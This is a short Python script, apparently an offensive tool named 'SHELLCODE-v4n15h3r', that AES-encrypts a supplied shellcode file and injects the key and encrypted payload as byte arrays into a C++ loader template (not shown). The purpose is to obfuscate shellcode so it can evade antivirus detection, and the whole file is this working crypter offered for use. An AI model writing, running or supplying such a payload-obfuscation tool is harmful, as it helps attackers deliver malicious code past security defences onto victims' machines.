# SHELLCODE-v4n15h3r
# git5 - LoxoSec
# https://git5loxosec.github.io

import sys
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext):
    key = generate_random_key(16)
    iv = urandom(16)
    salt = urandom(16)
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    ciphertext_base64 = base64.b64encode(ciphertext).decode('utf-8')
    return key, iv, ciphertext, salt, ciphertext_base64

def generate_random_key(key_length):
    return urandom(key_length)

try:
    if len(sys.argv) != 2:
        print("e.g.: v4n15h3r.py SHELLCODE_FILENAME")
        sys.exit(1)

    file_path = sys.argv[1]
    with open(file_path, "rb") as file:
        content = file.read()

    key, iv, ciphertext, salt, ciphertext_base64 = AESencrypt(content)

    template = open("template.cpp", "rt")
    data = template.read()
    data = data.replace("unsigned char AESkey[] = { };", 'unsigned char AESkey[] = { ' + ', '.join(f'0x{x:02x}' for x in key) + ' };')
    base64_bytes = ciphertext_base64.encode('utf-8')
    data = data.replace("unsigned char payload[] = { };", 'unsigned char payload[] = { ' + ', '.join(f'0x{x:02x}' for x in iv + ciphertext + salt + base64_bytes) + ' };')

    template.close()

    with open("new.template.cpp", "w+") as template:
        template.write(data)

except FileNotFoundError:
    print(f"Error: File '{file_path}' not found.")
except Exception as e:
    print(f"An error occurred: {e}")
